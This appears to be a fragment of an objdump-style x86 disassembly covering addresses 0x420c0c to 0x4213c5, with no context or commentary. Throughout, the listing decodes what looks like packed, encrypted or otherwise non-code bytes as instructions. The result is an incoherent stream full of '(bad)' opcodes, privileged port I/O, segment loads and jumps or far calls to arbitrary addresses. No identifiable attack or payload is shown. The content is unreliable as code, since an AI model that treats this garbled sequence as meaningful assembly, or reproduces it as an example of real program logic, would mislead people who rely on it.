  420c0c:	or     edi,DWORD PTR [eax]
  420c0e:	outs   dx,BYTE PTR ds:[esi]
  420c0f:	ds mov ah,0x54
  420c12:	shl    BYTE PTR [edx-0x64d67e03],cl
  420c18:	repz daa 
  420c1a:	ret    0x4e3b
  420c1d:	mov    ch,0xdb
  420c1f:	mov    cs,WORD PTR [esi]
  420c21:	or     al,BYTE PTR [esi-0x3df4acbd]
  420c27:	mov    edx,0xb40c0a95
  420c2c:	and    al,0x5e
  420c2e:	in     eax,0x60
  420c30:	clc    
  420c31:	stos   DWORD PTR es:[edi],eax
  420c32:	and    al,BYTE PTR [ebx+0x18794c41]
  420c38:	cld    
  420c39:	cmp    DWORD PTR [ebp+0x64],ebx
  420c3c:	rol    BYTE PTR [edi],1
  420c3e:	push   edi
  420c3f:	loopne 0x420c31
  420c41:	xchg   edx,eax
  420c42:	pop    ebp
  420c43:	fmul   QWORD PTR [ebx]
  420c45:	rol    cl,0xbb
  420c48:	mov    cl,0xb7
  420c4a:	mov    cl,0x20
  420c4c:	pop    ss
  420c4d:	jmp    0xf8ab334e
  420c52:	dec    ebp
  420c53:	push   es
  420c54:	sbb    edi,edx
  420c56:	sub    eax,0x8c2a18f
  420c5b:	jae    0x420c40
  420c5d:	mov    esi,0xba374227
  420c62:	pop    ds
  420c63:	dec    ebp
  420c64:	(bad)  
  420c65:	inc    eax
  420c66:	mov    bl,0x76
  420c68:	xchg   esi,eax
  420c69:	and    eax,0x8c86e00b
  420c6e:	pop    esp
  420c6f:	call   0x2f0b:0x2a723ead
  420c76:	cmp    al,0x78
  420c78:	js     0x420cbc
  420c7a:	sti    
  420c7b:	mov    al,ds:0x59a84b02
  420c80:	and    ch,dh
  420c82:	in     eax,dx
  420c83:	scas   eax,DWORD PTR es:[edi]
  420c84:	ins    BYTE PTR es:[edi],dx
  420c85:	retf   0xc7b0
  420c88:	sbb    eax,0x2751c381
  420c8d:	fisubr WORD PTR [esi+0x64]
  420c90:	cmp    ah,0xd1
  420c93:	adc    eax,esi
  420c95:	jmp    0x420c23
  420c97:	mov    ebx,DWORD PTR [edx-0x45466b3b]
  420c9d:	xor    edx,edx
  420c9f:	adc    ah,BYTE PTR [ebx-0x74]
  420ca2:	(bad)  
  420ca3:	sub    bl,BYTE PTR [eax-0x35]
  420ca6:	push   ebx
  420ca7:	repnz (bad) 
  420ca9:	fsincos 
  420cab:	int    0xa5
  420cad:	push   cs
  420cae:	xchg   esp,eax
  420caf:	fld    QWORD PTR [edi]
  420cb1:	int    0xd3
  420cb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cb4:	jg     0x420c5a
  420cb6:	push   edx
  420cb7:	dec    esp
  420cb8:	push   edx
  420cb9:	popf   
  420cba:	and    BYTE PTR [esi],0x23
  420cbd:	ds jp  0x420cdc
  420cc0:	push   ds
  420cc1:	(bad)  
  420cc2:	mov    ch,0xc5
  420cc4:	lods   al,BYTE PTR ds:[esi]
  420cc5:	inc    ebx
  420cc6:	xchg   ebp,eax
  420cc7:	sbb    BYTE PTR [eax],dl
  420cc9:	add    BYTE PTR [ebp-0x52a3fc14],al
  420ccf:	test   al,0x9e
  420cd1:	push   esp
  420cd2:	push   0xb715430c
  420cd7:	ins    BYTE PTR es:[edi],dx
  420cd8:	sbb    al,0xde
  420cda:	adc    ebp,esi
  420cdc:	and    al,0x20
  420cde:	(bad)  
  420cdf:	mov    eax,0x4d36422c
  420ce4:	lods   al,BYTE PTR ds:[esi]
  420ce5:	into   
  420ce6:	jl     0x420caa
  420ce8:	outs   dx,BYTE PTR ds:[esi]
  420ce9:	push   ss
  420cea:	push   ebx
  420ceb:	jo     0x420c83
  420ced:	mov    esp,0x43cc03c2
  420cf2:	pop    ebp
  420cf3:	neg    DWORD PTR [ecx-0x4b]
  420cf6:	mov    eax,0x7fefd2fd
  420cfb:	call   DWORD PTR [edi-0x35]
  420cfe:	add    esi,DWORD PTR [edx]
  420d00:	pop    eax
  420d01:	xor    al,BYTE PTR [edi]
  420d03:	jp     0x420d13
  420d05:	xchg   ebp,eax
  420d06:	mov    WORD PTR [edi],?
  420d08:	ret    
  420d09:	push   DWORD PTR [edx]
  420d0b:	bswap  ecx
  420d0d:	mov    edx,0xcbcc4b84
  420d12:	add    eax,0x4167f4aa
  420d17:	mov    esp,0xcfee04e6
  420d1c:	(bad)  
  420d1d:	scas   eax,DWORD PTR es:[edi]
  420d1e:	std    
  420d1f:	popa   
  420d20:	push   es
  420d21:	mov    ah,0xa2
  420d23:	cli    
  420d24:	cmp    DWORD PTR [ecx-0x3efcf92a],edx
  420d2a:	out    dx,eax
  420d2b:	and    eax,0x9112abd0
  420d30:	imul   esi,DWORD PTR [edi],0x653da282
  420d36:	hlt    
  420d37:	or     al,0xfe
  420d39:	sub    BYTE PTR [ebp+0x1],0x59
  420d3d:	aas    
  420d3e:	in     al,dx
  420d3f:	push   ebx
  420d40:	das    
  420d41:	xlat   BYTE PTR ds:[ebx]
  420d42:	clc    
  420d43:	cdq    
  420d44:	jns    0x420d9f
  420d46:	(bad)  
  420d47:	jo     0x420cff
  420d49:	xor    BYTE PTR [eax+0x1b],bh
  420d4c:	pop    ebp
  420d4d:	scas   al,BYTE PTR es:[edi]
  420d4e:	pop    esi
  420d4f:	sbb    BYTE PTR [ecx+0x7b],ah
  420d52:	inc    DWORD PTR [esi-0xc]
  420d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d56:	mov    bh,0x26
  420d58:	mov    al,0xf8
  420d5a:	push   cs
  420d5b:	sbb    eax,0x3da1aca2
  420d60:	dec    ebp
  420d62:	add    eax,0x68244a05
  420d67:	or     edx,DWORD PTR [edx-0x42ac9d8c]
  420d6d:	adc    DWORD PTR [ecx],eax
  420d6f:	out    dx,al
  420d70:	inc    esi
  420d71:	outs   dx,BYTE PTR ds:[esi]
  420d72:	ds (bad) 
  420d74:	pop    ebp
  420d75:	cwde   
  420d76:	or     al,0xc8
  420d78:	aad    0x74
  420d7a:	sbb    al,0xfc
  420d7c:	mov    dl,0xfd
  420d7e:	mov    ecx,ebx
  420d80:	and    ebp,DWORD PTR ds:0x94be8a89
  420d86:	data16 jecxz 0x420d28
  420d89:	mov    BYTE PTR [edi+edi*1-0x4f],bh
  420d8d:	jae    0x420d75
  420d8f:	cmp    bh,BYTE PTR [esi+esi*4-0xc60bbf6]
  420d96:	ins    DWORD PTR es:[edi],dx
  420d97:	mov    DWORD PTR [edi],eax
  420d99:	or     eax,0xa955d58d
  420d9e:	fdivr  st,st(1)
  420da0:	adc    esi,esp
  420da2:	inc    eax
  420da3:	out    0x2c,eax
  420da5:	mov    bh,0x9a
  420da7:	in     al,0xef
  420da9:	cmp    eax,0xf339249
  420dae:	xlat   BYTE PTR ds:[ebx]
  420daf:	idiv   DWORD PTR [ebp-0x66]
  420db2:	jmp    0x615a03d0
  420db7:	popa   
  420db8:	mov    BYTE PTR [ebx+0xa3bf293],dh
  420dbe:	daa    
  420dbf:	fisubr DWORD PTR [ebx]
  420dc1:	xor    al,0x51
  420dc3:	icebp  
  420dc4:	nop
  420dc5:	fcom   DWORD PTR [esi-0x36ef248d]
  420dcb:	sub    dl,BYTE PTR [eax-0x5b]
  420dce:	addr16 xchg esp,eax
  420dd0:	repnz in eax,dx
  420dd2:	and    BYTE PTR [ebx-0x689065bd],bh
  420dd8:	fimul  WORD PTR [ecx+0x248c9587]
  420dde:	jge    0x420dfe
  420de0:	jnp    0x420da0
  420de2:	mov    esp,0x64e7675d
  420de7:	nop
  420de8:	icebp  
  420de9:	adc    cl,BYTE PTR [edi-0x6b221295]
  420def:	test   eax,0xff6025a
  420df4:	lock inc ecx
  420df6:	pop    edx
  420df7:	mov    ah,0xfd
  420df9:	mov    al,ds:0xdab7430e
  420dfe:	repnz fadd st(1),st
  420e01:	adc    dh,ch
  420e03:	jp     0x420e5c
  420e05:	xchg   edi,eax
  420e06:	cs push edi
  420e08:	dec    edi
  420e09:	push   0x5dd0ff2c
  420e0e:	inc    ebp
  420e0f:	dec    ecx
  420e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e11:	xchg   ebx,eax
  420e12:	add    eax,0x772770c8
  420e17:	frstor [edi]
  420e19:	sti    
  420e1a:	inc    esi
  420e1b:	mov    bl,0x50
  420e1d:	push   ecx
  420e1e:	dec    ebp
  420e1f:	push   0xffffff80
  420e21:	test   BYTE PTR [esi+0x4e75a999],0x74
  420e28:	das    
  420e29:	into   
  420e2a:	mov    ecx,0x6454aa5f
  420e2f:	repz dec eax
  420e31:	imul   ebp,DWORD PTR [edx+0x14],0x71
  420e35:	sahf   
  420e36:	(bad)  
  420e37:	iret   
  420e38:	mov    ds,esp
  420e3a:	(bad)  
  420e3b:	sbb    ebp,DWORD PTR [ebx]
  420e3d:	das    
  420e3e:	call   0xf419a8b2
  420e43:	or     al,0xc3
  420e45:	bnd ret 
  420e47:	cmp    BYTE PTR [eax-0xb3b8224],dh
  420e4d:	mov    eax,fs:0x6e05b61b
  420e53:	fidivr DWORD PTR [eax]
  420e55:	adc    esp,DWORD PTR [eax+eiz*8+0xcc09613]
  420e5c:	mov    al,dh
  420e5e:	xchg   ebx,eax
  420e5f:	dec    esp
  420e60:	sti    
  420e61:	ins    BYTE PTR es:[edi],dx
  420e62:	mov    esp,DWORD PTR [esi-0x79726a22]
  420e68:	outs   dx,BYTE PTR ds:[esi]
  420e69:	mov    dh,0xc8
  420e6b:	mov    WORD PTR [ecx+0x6f],?
  420e6e:	sti    
  420e6f:	je     0x420e05
  420e71:	xchg   edx,eax
  420e72:	push   edx
  420e73:	lds    eax,FWORD PTR [edi+0x661ed5a0]
  420e79:	imul   edx,DWORD PTR [eax+0x70c0e89e],0xd67e4986
  420e83:	outs   dx,DWORD PTR ds:[esi]
  420e84:	test   DWORD PTR [eax-0x55],0xee7d65a
  420e8b:	ret    0xd652
  420e8e:	jge    0x420e9b
  420e90:	loopne 0x420eee
  420e92:	leave  
  420e93:	fnsave [eax+0x4ae5f834]
  420e99:	push   ds
  420e9a:	add    dl,al
  420e9c:	(bad)  
  420e9d:	and    al,0xe8
  420e9f:	sbb    edi,DWORD PTR [ecx]
  420ea1:	fsubr  st(7),st
  420ea3:	mov    ds:0xef6197d,al
  420ea8:	jmp    eax
  420eaa:	jns    0x420e81
  420eac:	adc    al,0xc9
  420eae:	call   0x6cbb7e58
  420eb3:	xchg   edi,eax
  420eb4:	pop    esi
  420eb5:	out    0xef,al
  420eb7:	(bad)  
  420eb8:	mov    bh,0x44
  420eba:	jns    0x420e4b
  420ebc:	push   ebx
  420ebd:	test   eax,0xc94ab61c
  420ec2:	je     0x420e9b
  420ec4:	das    
  420ec5:	aaa    
  420ec6:	call   0x52ba:0xd345385
  420ecd:	mov    ch,0x98
  420ecf:	jb     0x420edb
  420ed1:	and    cl,BYTE PTR [esp+edi*2]
  420ed4:	daa    
  420ed5:	xchg   edi,eax
  420ed6:	push   es
  420ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ed8:	xchg   esi,eax
  420ed9:	cdq    
  420eda:	adc    eax,0xa7e4f1dd
  420edf:	shl    dh,0x3c
  420ee2:	out    0xc4,eax
  420ee4:	xchg   esi,eax
  420ee5:	int    0xfa
  420ee7:	fadd   QWORD PTR [esi-0x1edc6665]
  420eed:	retf   0x19b0
  420ef0:	aam    0x86
  420ef2:	(bad)  
  420ef3:	stc    
  420ef4:	jo     0x420f72
  420ef6:	sub    DWORD PTR [edx],eax
  420ef8:	mov    edx,0x758667e9
  420efd:	inc    edi
  420efe:	pop    esi
  420eff:	xchg   edi,eax
  420f00:	ins    BYTE PTR es:[edi],dx
  420f01:	outs   dx,BYTE PTR ds:[esi]
  420f02:	and    al,0x5b
  420f04:	jno    0x420f50
  420f06:	inc    eax
  420f07:	mov    BYTE PTR [esi+0x71],dh
  420f0a:	icebp  
  420f0b:	mov    ds:0xd800f1c8,eax
  420f10:	fnstenv [ebp+0x72]
  420f13:	repnz ins DWORD PTR es:[edi],dx
  420f15:	ins    BYTE PTR es:[edi],dx
  420f16:	mov    esi,0x87ba0897
  420f1b:	stos   BYTE PTR es:[edi],al
  420f1c:	scas   eax,DWORD PTR es:[edi]
  420f1d:	imul   edi,DWORD PTR [edx-0x2527009b],0x45
  420f24:	div    DWORD PTR [esi+0x6a]
  420f27:	mov    ebp,0xc58ddfea
  420f2c:	jmp    0x420f1c
  420f2e:	push   ebx
  420f2f:	adc    ebp,esi
  420f31:	sbb    eax,0x5083092a
  420f36:	out    dx,al
  420f37:	fstp   TBYTE PTR [ebx+0x50]
  420f3a:	jge    0x420ef9
  420f3c:	xlat   BYTE PTR ds:[ebx]
  420f3d:	xchg   edx,eax
  420f3e:	dec    edi
  420f3f:	xchg   ebp,eax
  420f40:	popa   
  420f41:	or     ah,ah
  420f43:	jb     0x420f93
  420f45:	or     DWORD PTR [ecx+0x380dcb8c],edx
  420f4b:	jns    0x420fb0
  420f4d:	mov    BYTE PTR [ecx],ch
  420f4f:	lea    eax,[edi]
  420f51:	and    BYTE PTR [edi],ah
  420f53:	mov    bl,0xa3
  420f55:	xor    DWORD PTR [ebp+0x42b5328e],0xb5a8baac
  420f5f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  420f61:	aaa    
  420f62:	xor    DWORD PTR [esi],ebx
  420f64:	int    0x3b
  420f66:	je     0x420f8b
  420f68:	fsub   DWORD PTR [esi+0x71]
  420f6b:	mov    bh,0x10
  420f6d:	test   eax,0x72119613
  420f72:	sub    DWORD PTR [ebp+0x47],edx
  420f75:	shl    DWORD PTR [ebp+0x6e0afa8a],0xf7
  420f7c:	mov    al,ds:0x6841e09
  420f81:	sub    DWORD PTR [edx],ecx
  420f83:	pop    es
  420f84:	daa    
  420f85:	pop    ss
  420f86:	mov    edi,0x87153f99
  420f8b:	test   BYTE PTR [ebp+0x48e69b1a],ch
  420f91:	sahf   
  420f92:	push   ebp
  420f93:	bound  ebx,QWORD PTR [edi]
  420f95:	lods   al,BYTE PTR ds:[esi]
  420f96:	mov    esi,0xfbd230bc
  420f9b:	ficom  DWORD PTR [ebp+0x56ddb065]
  420fa1:	mov    es,WORD PTR [ebx-0x5e]
  420fa4:	mov    gs,WORD PTR ds:0xfd8b14b6
  420faa:	pcmpeqb mm7,QWORD PTR ds:0x1abce935
  420fb1:	mov    edx,0xcb6cbd8
  420fb6:	mov    dl,0x10
  420fb8:	cmp    eax,0xa7ead200
  420fbd:	jae    0x42102d
  420fbf:	mov    ebp,0x91b3e784
  420fc4:	xchg   edi,eax
  420fc5:	rcr    BYTE PTR [edx+0x6ddec081],cl
  420fcb:	popa   
  420fcc:	push   edi
  420fcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fce:	mov    al,0xf0
  420fd0:	shl    DWORD PTR [esi],cl
  420fd2:	fstp   DWORD PTR [edx]
  420fd4:	imul   BYTE PTR [edx]
  420fd6:	addr16 pop ebx
  420fd8:	test   BYTE PTR [ecx+0x3e],cl
  420fdb:	aad    0xd8
  420fdd:	pop    ss
  420fde:	scas   al,BYTE PTR es:[edi]
  420fdf:	ret    
  420fe0:	sbb    DWORD PTR [ebp-0x3133cc56],0x5
  420fe7:	jne    0x420f8e
  420fe9:	sbb    esp,ebp
  420feb:	push   eax
  420fec:	mov    al,ds:0x4ed68b67
  420ff1:	(bad)  
  420ff2:	mov    ecx,0xdb9e0f13
  420ff7:	add    al,0x85
  420ff9:	jmp    0x56f53df3
  420ffe:	popf   
  420fff:	retf   
  421000:	lahf   
  421001:	test   DWORD PTR [ebp+0x5],0x398c459e
  421008:	sub    BYTE PTR [esi+0x33126b99],0xe5
  42100f:	cdq    
  421010:	dec    ecx
  421011:	out    dx,eax
  421012:	cmp    DWORD PTR [eax+0x4f927494],ebp
  421018:	xchg   esp,eax
  421019:	and    eax,0x419e1873
  42101e:	mov    BYTE PTR [eax],cl
  421020:	xchg   ecx,eax
  421021:	(bad)  
  421023:	xchg   ebx,eax
  421024:	mov    edi,0xc950d9e7
  421029:	mov    ebp,0xde6b9658
  42102e:	adc    dh,BYTE PTR [ecx+0x64389759]
  421034:	ds inc edi
  421036:	repz pop edi
  421038:	fwait
  421039:	das    
  42103a:	call   0x4b9:0x54391ec0
  421041:	jae    0x421072
  421043:	in     eax,dx
  421044:	adc    al,0x7e
  421046:	dec    esp
  421047:	pop    ss
  421048:	xchg   ebx,eax
  421049:	repz fmul DWORD PTR [esi-0x56ab880c]
  421050:	jmp    0x522e82c4
  421055:	and    ebp,DWORD PTR [edx+0x12e3753a]
  42105b:	in     al,0xe1
  42105d:	aas    
  42105e:	xchg   edx,eax
  42105f:	dec    ecx
  421060:	mov    esp,0x91710325
  421065:	push   edx
  421066:	mov    esi,0x62709d0f
  42106b:	add    ecx,ebx
  42106d:	mov    ebx,0x379ce4e
  421072:	addr16 ret 
  421074:	hlt    
  421075:	push   ebp
  421076:	jmp    DWORD PTR [esp+ecx*1]
  421079:	inc    edx
  42107a:	retf   
  42107b:	jp     0x421052
  42107d:	sbb    al,0x6e
  42107f:	enter  0x710c,0xbf
  421083:	test   DWORD PTR [ebp-0x4b01cefc],ecx
  421089:	or     al,0xda
  42108b:	cmp    DWORD PTR [ecx-0x1d],0xffffffd4
  42108f:	cmp    BYTE PTR [edi+esi*8-0x6222f45d],dh
  421096:	clc    
  421097:	bound  ebp,QWORD PTR [ebx+0x68]
  42109a:	mov    WORD PTR [edx],ss
  42109c:	out    dx,al
  42109d:	fisub  DWORD PTR ds:0xd6b93d8a
  4210a3:	mov    BYTE PTR [edi-0x11a2d961],ah
  4210a9:	inc    ebx
  4210aa:	adc    eax,0xe7c0b1de
  4210af:	ja     0x42109a
  4210b1:	adc    ah,BYTE PTR [edi-0xe192287]
  4210b7:	cmp    ebp,DWORD PTR [esp+ebx*8+0x1d51eaed]
  4210be:	add    BYTE PTR [ecx+0x0],0xf
  4210c2:	push   ds
  4210c3:	xchg   ecx,eax
  4210c4:	sub    eax,0x9a443753
  4210c9:	cmp    al,0x7e
  4210cb:	out    0x57,eax
  4210cd:	js     0x421134
  4210cf:	xchg   ebx,eax
  4210d0:	jnp    0x421059
  4210d2:	mov    esi,0x56438f60
  4210d7:	retf   
  4210d8:	mov    WORD PTR [ebp-0x2a],?
  4210db:	scas   eax,DWORD PTR es:[edi]
  4210dc:	lds    edi,FWORD PTR [ecx+0x3f]
  4210df:	mov    ah,0x86
  4210e1:	icebp  
  4210e2:	mov    bh,0x6d
  4210e4:	popf   
  4210e5:	xor    ebx,esp
  4210e7:	div    BYTE PTR [eax]
  4210e9:	push   ebp
  4210ea:	popa   
  4210eb:	cmp    al,0x50
  4210ed:	sbb    BYTE PTR [ebx+0x25],dl
  4210f0:	call   0xa7c0:0xf3148a41
  4210f7:	ins    BYTE PTR es:[edi],dx
  4210f8:	ins    BYTE PTR es:[edi],dx
  4210f9:	dec    esp
  4210fa:	out    dx,eax
  4210fb:	aaa    
  4210fc:	in     eax,0x9a
  4210fe:	xchg   ebp,eax
  4210ff:	pop    eax
  421101:	add    ah,ch
  421103:	ret    
  421104:	xchg   esp,eax
  421105:	test   esi,esp
  421107:	fucomp st(0)
  421109:	mov    ebx,0x365d74c3
  42110e:	je     0x4210f7
  421110:	sub    BYTE PTR [edi-0x664de336],0xc4
  421117:	inc    edi
  421118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421119:	scas   eax,DWORD PTR es:[edi]
  42111a:	xchg   edi,eax
  42111b:	xlat   BYTE PTR ds:[ebx]
  42111c:	and    al,0x8c
  42111e:	inc    esi
  42111f:	out    dx,al
  421120:	dec    ebp
  421121:	ss pop ebx
  421123:	lods   al,BYTE PTR ds:[esi]
  421124:	adc    eax,0x3e19a211
  421129:	ret    
  42112a:	popa   
  42112b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42112c:	sti    
  42112d:	sub    bh,ch
  42112f:	lahf   
  421130:	ds xor eax,0x92274f00
  421137:	pop    edi
  421138:	mov    eax,0x87e8d3e7
  42113d:	das    
  42113e:	pop    ebx
  42113f:	adc    BYTE PTR [ebp+0x7a4c88ce],al
  421145:	or     eax,0x70fc1a33
  42114a:	retf   
  42114b:	xchg   esi,eax
  42114c:	(bad)  [eax]
  42114e:	or     dh,bh
  421150:	fwait
  421151:	es ins BYTE PTR es:[edi],dx
  421153:	test   BYTE PTR [ecx+0x43],dl
  421156:	out    dx,eax
  421157:	adc    ebx,eax
  421159:	cdq    
  42115a:	or     BYTE PTR [esi+ebx*1+0x788ae307],bh
  421161:	sub    ch,ah
  421163:	pop    dx
  421165:	pop    ebp
  421166:	jecxz  0x42118e
  421168:	in     al,dx
  421169:	add    esi,DWORD PTR [ecx+0x5d]
  42116c:	sub    edx,eax
  42116e:	ret    
  42116f:	or     al,0x6b
  421171:	repnz cdq 
  421173:	ss jns 0x42116f
  421176:	inc    eax
  421177:	dec    eax
  421178:	into   
  421179:	or     bh,BYTE PTR [eax+0x11]
  42117c:	jo     0x4211f3
  42117e:	test   eax,0xde610725
  421183:	push   ebp
  421184:	adc    BYTE PTR [esi],ah
  421186:	inc    edi
  421187:	cmp    DWORD PTR [ecx-0x67f1e869],esp
  42118d:	test   BYTE PTR [esi],cl
  42118f:	data16 mov dh,0x36
  421192:	and    eax,DWORD PTR [edi+0x76]
  421195:	imul   ebp,DWORD PTR [eax-0x14c7b59c],0xffffff8e
  42119c:	cwde   
  42119d:	dec    ebp
  42119e:	repz mov bh,0xcd
  4211a1:	cmp    eax,0xa76961d5
  4211a6:	je     0x4211ab
  4211a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211a9:	pextrw edx,mm0,0x95
  4211ad:	mov    edi,0xcc02a7e6
  4211b2:	aad    0x75
  4211b4:	out    0xfd,eax
  4211b6:	push   edx
  4211b7:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4211b9:	mov    al,BYTE PTR [eax]
  4211bb:	xchg   esp,eax
  4211bc:	outs   dx,BYTE PTR ds:[esi]
  4211bd:	pusha  
  4211be:	pop    es
  4211bf:	pusha  
  4211c0:	mov    ebx,0xb3134b50
  4211c5:	pop    ds
  4211c6:	sbb    al,0xe7
  4211c8:	cmp    ebp,0xffffff97
  4211cb:	test   eax,0x2f714e4c
  4211d0:	scas   eax,DWORD PTR es:[edi]
  4211d1:	inc    ebp
  4211d2:	lock add ebp,DWORD PTR [edx+0x37ffe3ac]
  4211d9:	test   al,0xa4
  4211db:	jb     0x4211df
  4211dd:	adc    ch,cl
  4211df:	push   ecx
  4211e0:	pop    eax
  4211e1:	sub    BYTE PTR [edx],cl
  4211e3:	out    0x60,al
  4211e5:	fcom   QWORD PTR [eax+0x3db834e9]
  4211eb:	mov    edx,0x25c4fb65
  4211f0:	adc    BYTE PTR [esi+0x1ab4710b],cl
  4211f6:	lahf   
  4211f7:	out    0x23,eax
  4211f9:	pop    ebp
  4211fa:	sbb    DWORD PTR [esi+edx*8-0x343f7bec],ecx
  421201:	mov    cs,esp
  421203:	test   esp,esi
  421205:	add    al,0x67
  421207:	in     al,dx
  421208:	jns    0x42119c
  42120a:	lock in al,0x25
  42120d:	xor    BYTE PTR [edx-0x18300552],0x3c
  421214:	in     eax,0x7d
  421216:	setae  BYTE PTR [esi]
  421219:	int3   
  42121a:	loop   0x42123b
  42121c:	aas    
  42121d:	adc    al,0x59
  421220:	mov    BYTE PTR [edx-0x55],bh
  421223:	in     al,0x47
  421225:	push   ebp
  421226:	sub    DWORD PTR [ebx-0x2e54de60],edx
  42122c:	aaa    
  42122d:	in     eax,0xf6
  42122f:	adc    BYTE PTR [esi+0x5c9ed48f],0x67
  421236:	xor    DWORD PTR [ebx+0x59],esp
  421239:	pusha  
  42123a:	enter  0x65df,0x41
  42123e:	mov    ah,0x2e
  421240:	push   es
  421241:	cwde   
  421242:	pop    ecx
  421243:	test   eax,0x61644b34
  421248:	mov    ebp,0xa13855bf
  42124d:	adc    esp,DWORD PTR [edi-0x60]
  421250:	imul   edx,eax,0xffffffed
  421253:	int    0x10
  421255:	mov    ah,0x16
  421257:	(bad)  
  421259:	mov    ecx,0x72686416
  42125e:	add    BYTE PTR [esi],cl
  421260:	out    0x83,eax
  421262:	jnp    0x4212b7
  421264:	dec    eax
  421265:	dec    ebp
  421266:	pop    es
  421267:	xor    BYTE PTR ds:0xed8c81a4,0xd
  42126e:	mov    BYTE PTR [eax],al
  421270:	xlat   BYTE PTR ds:[ebx]
  421271:	test   eax,0x8e9fa7e3
  421276:	mov    esi,0x44cde9b4
  42127b:	mov    edi,0xadb983ea
  421280:	mov    edi,0x18b13f9
  421285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421286:	lods   al,BYTE PTR ds:[esi]
  421287:	stos   DWORD PTR es:[edi],eax
  421288:	push   edx
  421289:	adc    dl,BYTE PTR [ebx+0x7]
  42128c:	or     eax,0x55eb6f64
  421291:	dec    edi
  421292:	mov    ds:0x8f27ae4c,eax
  421297:	outs   dx,BYTE PTR ds:[esi]
  421298:	xor    eax,0x84c3dc6c
  42129d:	scas   eax,DWORD PTR es:[edi]
  42129e:	mov    eax,ds:0xde99f9d5
  4212a3:	cmp    al,0x2f
  4212a5:	cmp    DWORD PTR [ebx+eax*1-0x2d],esi
  4212a9:	push   ss
  4212aa:	xor    al,cl
  4212ac:	sub    ch,BYTE PTR [eax+0x65fdcb70]
  4212b2:	or     BYTE PTR [esi+eiz*2+0x63],0x2f
  4212b7:	push   edx
  4212b8:	pop    ecx
  4212b9:	jb     0x4212bb
  4212bb:	outs   dx,DWORD PTR ds:[esi]
  4212bc:	(bad)  
  4212bd:	xor    al,BYTE PTR [edi+0x7b]
  4212c0:	aaa    
  4212c1:	ss xor al,0x6c
  4212c4:	clc    
  4212c5:	cld    
  4212c6:	push   ss
  4212c7:	lods   al,BYTE PTR ds:[esi]
  4212c8:	jl     0x4212cd
  4212ca:	cmp    DWORD PTR [eax],edx
  4212cc:	cmp    dh,BYTE PTR [edi+0x1c]
  4212cf:	xchg   esi,eax
  4212d0:	test   DWORD PTR ds:0xc777cbf4,edi
  4212d6:	pop    es
  4212d7:	(bad)  
  4212d8:	mov    ebp,0x51508659
  4212dd:	fnop   
  4212df:	repnz push ecx
  4212e1:	add    edi,eax
  4212e3:	dec    esp
  4212e4:	jg     0x421273
  4212e6:	pop    ds
  4212e7:	add    dh,BYTE PTR [esi-0x46d0b467]
  4212ed:	cmp    DWORD PTR [ecx],ecx
  4212ef:	repnz sbb al,BYTE PTR [esi-0xd]
  4212f3:	adc    edi,DWORD PTR [ebx+0x7f3ca3f7]
  4212f9:	les    esi,FWORD PTR ds:0x49f10c9c
  4212ff:	int3   
  421300:	outs   dx,BYTE PTR ds:[esi]
  421301:	std    
  421302:	mov    ebx,edx
  421304:	mov    dl,0x3e
  421306:	xchg   esi,eax
  421307:	xchg   edx,eax
  421308:	imul   esp,DWORD PTR [esp+eax*2-0x7dafa604],0xffffff87
  421310:	cmp    ch,dl
  421312:	jo     0x4212ff
  421314:	cmp    dl,BYTE PTR [ebx+0x57]
  421317:	xchg   esp,eax
  421318:	sbb    eax,0x3a258ff0
  42131d:	scas   eax,DWORD PTR es:[edi]
  42131e:	pop    edi
  42131f:	fistp  QWORD PTR [ecx+0x58]
  421322:	iret   
  421323:	cli    
  421324:	add    edi,ebx
  421326:	xor    al,0x42
  421328:	inc    esp
  421329:	xchg   ebx,eax
  42132a:	fild   QWORD PTR [ebx]
  42132c:	ja     0x42137c
  42132e:	shl    DWORD PTR ss:[edi-0x40],1
  421332:	fwait
  421333:	bound  esi,QWORD PTR [ecx-0x3]
  421336:	icebp  
  421337:	enter  0x190d,0x37
  42133b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42133c:	or     DWORD PTR [ebp+0x339857db],esi
  421342:	out    0x7f,eax
  421344:	stc    
  421345:	jo     0x42138a
  421347:	add    al,0x4c
  421349:	mov    al,ds:0xd7896eaf
  42134e:	enter  0x1f4d,0xb
  421352:	shr    ch,1
  421354:	outs   dx,BYTE PTR ds:[esi]
  421355:	push   esp
  421356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421358:	fdiv   DWORD PTR [edi]
  42135a:	add    edi,DWORD PTR [eax-0x34df3e7c]
  421360:	dec    esi
  421361:	test   bh,ah
  421363:	popf   
  421364:	ins    BYTE PTR es:[edi],dx
  421365:	pop    ss
  421366:	sbb    ebp,DWORD PTR [ebx-0x34e60b16]
  42136c:	cmp    ebx,eax
  42136e:	fadd   DWORD PTR [edi]
  421370:	add    ebp,edx
  421372:	xchg   esi,eax
  421373:	mov    ebx,0xbf34143d
  421378:	mov    esi,0xe5fd38bf
  42137d:	mov    ebx,0xb905c991
  421382:	inc    esp
  421383:	push   ds
  421384:	loop   0x4213c8
  421386:	aas    
  421387:	jmp    0xf320:0xc3b3d0f2
  42138e:	rol    DWORD PTR [edi+0x5b],cl
  421391:	jno    0x42135c
  421393:	sbb    BYTE PTR [esi+0x42ca147],bh
  421399:	adc    ecx,0xd2640961
  42139f:	mov    ecx,0x460106cc
  4213a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213a5:	mul    BYTE PTR [edx-0x5]
  4213a8:	arpl   bp,ax
  4213aa:	rcr    DWORD PTR [edi-0x15],0xc1
  4213ae:	test   dh,ch
  4213b0:	js     0x42134d
  4213b2:	sub    DWORD PTR [edx-0x1c],esi
  4213b5:	jmp    0x4213ad
  4213b7:	inc    edi
  4213b8:	or     BYTE PTR [esi+0x66aa1004],bl
  4213be:	mov    edi,0x831399f8
  4213c3:	jns    0x4213d3
  4213c5:	sbb    eax,0x67ea20f6
